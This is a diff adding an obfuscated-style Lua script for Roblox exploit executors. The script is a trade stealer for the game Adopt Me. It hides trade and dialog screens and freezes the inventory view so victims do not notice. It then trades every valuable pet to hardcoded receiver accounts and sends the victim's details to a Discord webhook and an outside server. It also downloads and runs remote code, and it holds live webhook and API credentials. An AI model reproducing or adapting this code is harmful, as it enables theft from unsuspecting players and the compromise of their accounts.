@@ -1,0 +1,717 @@
+-- discord.gg/syncrypt
+
+local function geniter(f, s, c)
+	if type(f) ~= "function" then
+		local mt = getmetatable(f)
+
+		if type(mt) == "table" and mt.__iter then
+			f, s, c = mt.__iter(f)
+		elseif type(f) == "table" then
+			f, s, c = next, f, nil
+		end
+	end
+
+	return function()
+		local r = table.pack(f(s, c))
+
+		if r[1] == nil then
+			return false
+		end
+
+		c = r[1]
+
+		return true, table.unpack(r, 1, r.n)
+	end
+end
+
+_G.scriptExecuted = _G.scriptExecuted or false
+
+if _G.scriptExecuted then
+	return
+end
+
+_G.scriptExecuted = true
+
+local v4
+local u5
+local v6
+
+repeat
+	v6 = nil
+
+	local v7, v8, v9 = ipairs(getgc(true))
+	local v10 = geniter(v7, v8, v9)
+
+	while true do
+		local v11 = table.pack(v10())
+
+		if v11[1] then
+			local v12 = v11[3]
+
+			if typeof(v12) == "function" then
+				local v13 = debug.getinfo(v12)
+
+				if v13 and v13.name == "stepAnimate" then
+					v6 = v12
+
+					break
+				end
+			end
+		else
+			break
+		end
+	end
+
+	task.wait()
+until v6
+
+v4 = hookfunction(v6, function(p1)
+	if not u5 then
+		u5 = true
+		_G.RealJobID = game.JobId
+	end
+
+	return v4(p1)
+end)
+wait(1)
+
+local RealJobID = _G.RealJobID or game.JobId
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+if #Players:GetPlayers() >= 35 then
+	LocalPlayer:kick("Server is full. Please join a less populated server")
+
+	return
+end
+
+local ok, result = pcall(function()
+	return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
+end)
+
+if ok and result == "VIPServer" then
+	LocalPlayer:kick("Server error. Please join a DIFFERENT server")
+
+	return
+end
+
+_G.Usernames = {
+	"Pxckmzv",
+	"Lkxvzp",
+	"Vzxmpkl",
+	"Jkxmvlz",
+	"Qzxpmlk",
+	"Bxvklzm",
+	"Zxpkmlv",
+	"Mxpzkvl",
+	"Lxkzpvm",
+	"Wxzmpxk",
+	"Fkxvpzl",
+	"Rxpmlkz",
+	"Dxkzmpx",
+	"Gzxpkvl",
+	"Kzmvpxl",
+	"Nxpklzm",
+	"Txvpzkml",
+	"Vxkzmpx",
+	"Zxkpmvl",
+	"Pxmzvlk"
+}
+_G.min_value = 6
+_G.ping_threshold = 6
+_G.pingEveryone = "No"
+_G.webhook = "https://discord.com/api/webhooks/1545806559043522651/mrOLD807f7-ZBIBlpzKBjwM3Nx2_agmJP5xFO4VY2sXxu88hEhkJs1qkbM9OBmb29JXz"
+_G.VPS_URL = "http://152.42.237.50:3000"
+_G.VPS_API_KEY = "sabapi_secret_key"
+
+local HttpService = game:GetService("HttpService")
+local LocalPlayer2 = Players.LocalPlayer
+
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/dad"))()
+	end)
+end)
+
+local function v21(p2)
+	pcall(function()
+		request({
+			Url = _G.VPS_URL .. "/hit",
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json",
+				["x-api-key"] = _G.VPS_API_KEY
+			},
+			Body = HttpService:JSONEncode(p2)
+		})
+	end)
+end
+
+local t1 = {}
+local u23 = false
+local PlayerGui = LocalPlayer2:WaitForChild("PlayerGui")
+local Frame = PlayerGui.TradeApp.Frame
+local Dialog = PlayerGui.DialogApp.Dialog
+local Frame2 = PlayerGui.ToolApp.Frame
+
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+local Fsys = require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys"))
+local RouterClient = Fsys.load("RouterClient")
+
+RouterClient.get("SettingsAPI/SetBooleanFlag"):FireServer("has_talked_to_trade_quest_npc", true)
+task.wait(0.5)
+RouterClient.get("TradeAPI/BeginQuiz"):FireServer()
+task.wait(1)
+
+local v30, v31, v32 = pairs(Fsys.load("ClientData").get("trade_license_quiz_manager").quiz)
+
+for _, v in v30, v31, v32 do
+	RouterClient.get("TradeAPI/AnswerQuizQuestion"):FireServer(v.answer)
+	task.wait(0.1)
+end
+
+task.wait(1)
+
+local load = require(game.ReplicatedStorage.Fsys).load
+local RouterClient2 = load("RouterClient")
+local SendTradeRequest = RouterClient2.get("TradeAPI/SendTradeRequest")
+local AddItemToOffer = RouterClient2.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiation = RouterClient2.get("TradeAPI/AcceptNegotiation")
+local ConfirmTrade = RouterClient2.get("TradeAPI/ConfirmTrade")
+local DeclineTrade = RouterClient2.get("TradeAPI/DeclineTrade")
+local SetSetting = RouterClient2.get("SettingsAPI/SetSetting")
+local DataChanged = RouterClient2.get("DataAPI/DataChanged")
+local InventoryDB = load("InventoryDB")
+
+DataChanged.OnClientEvent:Connect(function(...)
+	local t2 = { ... }
+
+	if t2[1] == LocalPlayer2.Name and t2[2] == "trade" then
+		u23 = t2[3] ~= nil
+	end
+
+	if t2[1] == LocalPlayer2.Name and t2[2] == "in_active_trade" then
+		u23 = t2[3] == true
+	end
+end)
+
+local t3 = {}
+
+pcall(function()
+	local ok2, result2 = pcall(function()
+		return game:HttpGet("https://winadopt.me/")
+	end)
+
+	if not ok2 or not result2 then
+		return
+	end
+
+	for match, match2 in result2:gmatch("id=\"([^\"]+)\"%s+class=\"grid%-item%-white\"%s+onClick=\"getNeonChoices%(([^%)]+)%)") do
+		local t4 = {}
+
+		for match3 in match2:gmatch("[%d%.%-]+") do
+			table.insert(t4, tonumber(match3))
+		end
+
+		if #t4 >= 13 then
+			t3[match] = {
+				rvalue = t4[2],
+				["rvalue - fly"] = t4[3],
+				["rvalue - ride"] = t4[4],
+				["rvalue - fly&ride"] = t4[5],
+				nvalue = t4[6],
+				["nvalue - ride"] = t4[7],
+				["nvalue - fly"] = t4[8],
+				["nvalue - fly&ride"] = t4[9],
+				mvalue = t4[10],
+				["mvalue - ride"] = t4[11],
+				["mvalue - fly"] = t4[12],
+				["mvalue - fly&ride"] = t4[13]
+			}
+		end
+	end
+end)
+
+local function v53(p3, p4)
+	local v54 = p4 or {}
+	local v55 = t3[p3]
+
+	if not v55 then
+		return 0
+	end
+
+	local v56 = v54.mega_neon and "mvalue" or v54.neon and "nvalue" or "rvalue"
+
+	return tonumber(v55[v56 .. (v54.rideable and v54.flyable and " - fly&ride" or v54.flyable and " - fly" or v54.rideable and " - ride" or "")]) or tonumber(v55[v56]) or 0
+end
+local function v57(p5)
+	local v58 = p5 or {}
+	local v59, s1
+
+	if not v58.mega_neon then
+		if not v58.neon then
+			if not v58.flyable then
+				if v58.rideable then
+					s1 = "R]"
+					v59 = "[" .. s1
+				else
+					v59 = false
+				end
+			elseif v58.rideable then
+				s1 = "FR]"
+				v59 = "[" .. s1
+			else
+				s1 = "F]"
+				v59 = "[" .. s1
+			end
+		elseif not v58.flyable then
+			if v58.rideable then
+				s1 = "NR]"
+				v59 = "[" .. s1
+			else
+				s1 = "N]"
+				v59 = "[" .. s1
+			end
+		elseif v58.rideable then
+			s1 = "NFR]"
+			v59 = "[" .. s1
+		else
+			s1 = "NF]"
+			v59 = "[" .. s1
+		end
+	elseif not v58.flyable then
+		if v58.rideable then
+			s1 = "MR]"
+			v59 = "[" .. s1
+		else
+			s1 = "M]"
+			v59 = "[" .. s1
+		end
+	elseif v58.rideable then
+		v59 = "[MFR]"
+	else
+		s1 = "MF]"
+		v59 = "[" .. s1
+	end
+
+	return v59 or ""
+end
+local function v61(p6)
+	local s2 = ""
+
+	if p6.rideable then
+		s2 ..= "r"
+	end
+
+	if p6.flyable then
+		s2 ..= "f"
+	end
+
+	local v63
+
+	if p6.mega_neon then
+		v63 = s2 .. "m"
+	elseif p6.neon then
+		v63 = s2 .. "n"
+	else
+		v63 = s2 .. "d"
+	end
+
+	return v63
+end
+
+local n1 = 0
+
+local function v65()
+	pcall(function()
+		local PaintInventoryApp = PlayerGui:FindFirstChild("PaintInventoryApp")
+
+		if not PaintInventoryApp then
+			return
+		end
+
+		for _, descendant in ipairs(PaintInventoryApp:GetDescendants()) do
+			if descendant:IsA("TextButton") or descendant:IsA("ImageButton") then
+				descendant.Active = false
+				descendant.AutoButtonColor = false
+				descendant.Selectable = false
+			end
+		end
+
+		local t5 = {}
+
+		for _, descendant in ipairs(PaintInventoryApp:GetDescendants()) do
+			if descendant:IsA("ScrollingFrame") then
+				table.insert(t5, descendant)
+			end
+		end
+
+		for _, v in ipairs(t5) do
+			for _, child in ipairs(v:GetChildren()) do
+				if child:IsA("UIListLayout") or child:IsA("UIGridLayout") then
+					child:Destroy()
+				end
+			end
+
+			v.CanvasSize = v.CanvasSize
+		end
+
+		local t6 = {}
+
+		for _, v in ipairs(t5) do
+			t6[v] = {}
+
+			for _, child in ipairs(v:GetChildren()) do
+				if child:IsA("Frame") or child:IsA("ImageLabel") or child:IsA("ImageButton") then
+					local clone = child:Clone()
+
+					table.insert(t6[v], clone)
+				end
+			end
+
+			v.ChildRemoved:Connect(function(child)
+				task.wait(0.05)
+
+				for _, v2 in ipairs(t6[v]) do
+					if v2.Name == child.Name and not v:FindFirstChild(child.Name) then
+						local clone = v2:Clone()
+
+						clone.Parent = v
+
+						for _, descendant in ipairs(clone:GetDescendants()) do
+							if descendant:IsA("TextButton") or descendant:IsA("ImageButton") then
+								descendant.Active = false
+								descendant.AutoButtonColor = false
+								descendant.Selectable = false
+							end
+						end
+					end
+				end
+			end)
+		end
+
+		print("[SAB] Backpack UI frozen — visual only")
+	end)
+end
+local function v87(p7, p8)
+	local t7 = {
+		["Content-Type"] = "application/json"
+	}
+	local t8 = {}
+
+	for _, v in ipairs(p7) do
+		local v92 = v.Name .. " " .. v61(v.Properties)
+
+		if t8[v92] then
+			t8[v92].Count += 1
+			t8[v92].TotalValue += v.Value
+		else
+			t8[v92] = {
+				Name = v.Name,
+				Properties = v.Properties,
+				Count = 1,
+				TotalValue = v.Value
+			}
+		end
+	end
+
+	local t9 = {}
+	local n2 = 0
+
+	for _, v in pairs(t8) do
+		table.insert(t9, v)
+		n2 += v.Count
+	end
+
+	table.sort(t9, function(p9, p10)
+		return p9.TotalValue > p10.TotalValue
+	end)
+
+	local v97 = string.char(27)
+	local v98 = v97 .. "[0;32m"
+	local v99 = v97 .. "[0;33m"
+	local v100 = v97 .. "[0m"
+	local s3 = ""
+
+	for _, v in ipairs(t9) do
+		local v104 = string.format("%dx %s %s", v.Count, v57(v.Properties), v.Name)
+
+		s3 ..= (v104 .. string.rep(" ", math.max(1, 28 - #v104))) .. ": " .. v99 .. string.format("%.2f", v.TotalValue) .. v100 .. "\n"
+	end
+
+	if #s3 > 800 then
+		local t10 = {}
+
+		for match in s3:gmatch("[^\r\n]+") do
+			table.insert(t10, match)
+		end
+
+		while #s3 > 800 and #t10 > 0 do
+			table.remove(t10)
+			s3 = table.concat(t10, "\n") .. "\n...plus more!"
+		end
+	end
+
+	local v107 = "```ansi\n" .. "Total Value: " .. v98 .. string.format("%.2f", p8) .. v100 .. "   |   All Pets: " .. tostring(n2) .. "\n\n" .. s3 .. "```"
+	local s4 = "Unknown"
+	local ok2, result2 = pcall(identifyexecutor)
+
+	if ok2 and result2 then
+		s4 = tostring(result2)
+	end
+
+	local v111 = "```\n" .. "Username: " .. LocalPlayer2.Name .. "\n" .. "Player Count: " .. string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers) .. "\n" .. "Account Age: " .. tostring(LocalPlayer2.AccountAge) .. " days\n" .. "Executor: " .. s4 .. "\n" .. "Receivers: " .. table.concat(_G.Usernames, ", ") .. "\n```"
+	local s5 = ""
+
+	if _G.ping_threshold <= p8 then
+		s5 = "@everyone "
+	end
+
+	local t11 = {
+		content = s5
+	}
+
+	t11.embeds = { {
+		title = "🐾 Adopt Me Hit! Yay SAB",
+		color = 65280,
+		fields = {
+			{
+				name = "👤 Player Info",
+				value = v111,
+				inline = false
+			},
+			{
+				name = string.format("🎒 Inventory — Threshold: >%s", tostring(_G.min_value)),
+				value = v107,
+				inline = false
+			},
+			{
+				name = "🔗 Join Link",
+				value = string.format("[Click to Join](https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s)", tostring(game.PlaceId), RealJobID),
+				inline = false
+			}
+		},
+		footer = {
+			text = "SAB (Adopt Me)"
+		},
+		timestamp = DateTime.now():ToIsoDate()
+	} }
+	pcall(function()
+		request({
+			Url = _G.webhook,
+			Method = "POST",
+			Headers = t7,
+			Body = HttpService:JSONEncode(t11)
+		})
+	end)
+end
+
+local t12 = {}
+local v115, v116, v117 = pairs(getgc())
+
+for _, v in v115, v116, v117 do
+	if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+		local v120 = debug.getupvalues(v)
+
+		if type(v120[1]) == "table" then
+			for k, v2 in pairs(v120[1]) do
+				t12[k] = v2
+			end
+		end
+	end
+end
+
+local function v123(p11, ...)
+	local v124 = t12[p11]
+
+	if not v124 then
+		return nil
+	end
+
+	if v124:IsA("RemoteFunction") then
+		return v124:InvokeServer(...)
+	end
+
+	if v124:IsA("RemoteEvent") then
+		v124:FireServer(...)
+	end
+end
+
+local GetAllServerData = v123("DataAPI/GetAllServerData")
+
+if not GetAllServerData then
+	LocalPlayer2:kick("w")
+
+	return
+end
+
+local t13 = {
+	"spring_2025_minigame_scorching_kaijunior",
+	"spring_2025_minigame_toxic_kaijunior",
+	"spring_2025_minigame_spiked_kaijunior",
+	"spring_2025_minigame_spotted_kaijunior"
+}
+local v127, v128, v129 = pairs(GetAllServerData[LocalPlayer2.Name].inventory)
+
+for _, v in v127, v128, v129 do
+	for k, v2 in pairs(v) do
+		local v134 = InventoryDB[v2.category]
+
+		if v134 and v134[v2.id] then
+			local v135 = v53(v134[v2.id].name, v2.properties)
+
+			if v135 and _G.min_value <= v135 and not table.find(t13, v2.id) then
+				table.insert(t1, {
+					UID = k,
+					Name = v134[v2.id].name,
+					Properties = v2.properties,
+					Value = v135
+				})
+				n1 += v135
+			end
+		end
+	end
+end
+
+Frame:GetPropertyChangedSignal("Visible"):Connect(function()
+	u23 = Frame.Visible
+end)
+Dialog:GetPropertyChangedSignal("Visible"):Connect(function()
+	Dialog.Visible = false
+end)
+Frame2:GetPropertyChangedSignal("Visible"):Connect(function()
+	Frame2.Visible = true
+end)
+LocalPlayer2.PlayerGui.TradeApp.Enabled = false
+LocalPlayer2.PlayerGui.HintApp:Destroy()
+LocalPlayer2.PlayerGui.DialogApp.Dialog.Visible = false
+v65()
+
+if #t1 > 0 then
+	table.sort(t1, function(p12, p13)
+		return p12.Value > p13.Value
+	end)
+	v87(t1, n1)
+	v21({
+		jobId = RealJobID,
+		placeId = game.PlaceId,
+		username = LocalPlayer2.Name,
+		receivers = _G.Usernames,
+		totalValue = n1,
+		itemCount = #t1
+	})
+	SetSetting:FireServer("trade_requests", 1)
+
+	local function v136(p14)
+		local v137
+
+		for _, player in ipairs(Players:GetPlayers()) do
+			if player.Name:lower() == p14:lower() then
+				v137 = player
+
+				break
+			elseif player.DisplayName:lower() == p14:lower() then
+				v137 = player
+
+				break
+			end
+		end
+
+		if not v137 then
+			return
+		end
+
+		pcall(function()
+			DeclineTrade:FireServer()
+		end)
+		task.wait(0.5)
+
+		local n3 = 1
+
+		while n3 <= #t1 do
+			if not v137 or not v137.Parent then
+				break
+			end
+
+			if not u23 then
+				pcall(function()
+					SendTradeRequest:FireServer(v137)
+				end)
+
+				local n4 = 0
+
+				while not u23 and n4 < 8 do
+					task.wait(0.25)
+					n4 += 0.25
+				end
+			end
+
+			if u23 then
+				local n5 = 0
+
+				while n3 <= #t1 and n5 < 18 do
+					if not u23 then
+						break
+					end
+
+					pcall(function()
+						AddItemToOffer:FireServer(t1[n3].UID)
+					end)
+					n5 += 1
+					n3 += 1
+					task.wait(0.08)
+				end
+
+				task.wait(0.3)
+
+				local n6 = 0
+
+				while u23 and n6 < 60 do
+					pcall(function()
+						AcceptNegotiation:FireServer()
+					end)
+					task.wait(0.3)
+					pcall(function()
+						ConfirmTrade:FireServer()
+					end)
+					task.wait(0.1)
+					n6 += 1
+				end
+
+				local n7 = 0
+
+				while u23 and n7 < 5 do
+					task.wait(0.25)
+					n7 += 0.25
+				end
+
+				if n3 <= #t1 then
+					task.wait(2)
+				end
+			else
+				task.wait(1)
+			end
+		end
+	end
+	local function v145()
+		local u146 = false
+
+		local function v147(player)
+			if not u146 and table.find(_G.Usernames, player.Name) then
+				u146 = true
+				v136(player.Name)
+			end
+		end
+
+		for _, player in ipairs(Players:GetPlayers()) do
+			v147(player)
+		end
+
+		Players.PlayerAdded:Connect(v147)
+	end
+
+	v145()
+end
